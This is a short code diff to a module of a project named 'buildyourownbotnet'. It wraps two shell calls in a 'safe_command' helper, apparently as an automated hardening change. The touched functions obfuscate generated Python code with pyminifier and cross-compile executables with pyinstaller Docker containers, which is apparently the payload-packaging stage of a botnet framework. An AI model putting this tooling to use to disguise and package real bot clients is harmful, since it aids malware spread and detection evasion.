@@ -18,6 +18,7 @@ import subprocess
 
 # modules
 from buildyourownbotnet.core import util
+from security import safe_command
 
 # templates
 template_main  = string.Template("""
@@ -139,7 +140,7 @@ def obfuscate(input):
     temp.file.write(input)
     temp.file.close()
     name = os.path.join(tempfile.gettempdir(), temp.name)
-    obfs = subprocess.Popen('pyminifier -o {} --obfuscate-classes --obfuscate-variables --replacement-length=1 {}'.format(name, name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+    obfs = safe_command.run(subprocess.Popen, 'pyminifier -o {} --obfuscate-classes --obfuscate-variables --replacement-length=1 {}'.format(name, name), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
     obfs.wait()
     output = open(name, 'r').read().replace('# Created by pyminifier (https://github.com/liftoff/pyminifier)', '')
     os.remove(name)
@@ -272,7 +273,7 @@ def freeze(filename, icon=None, hidden=None, owner=None, operating_system=None, 
     os.chdir(path)
 
     # cross-compile executable for the specified os/arch using pyinstaller docker containers
-    process = subprocess.Popen('docker run -v "$(pwd):/src/" {docker_container}'.format(
+    process = safe_command.run(subprocess.Popen, 'docker run -v "$(pwd):/src/" {docker_container}'.format(
                                 src_path=os.path.dirname(path), 
                                 docker_container=operating_system + '-' + architecture), 
                                 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, 
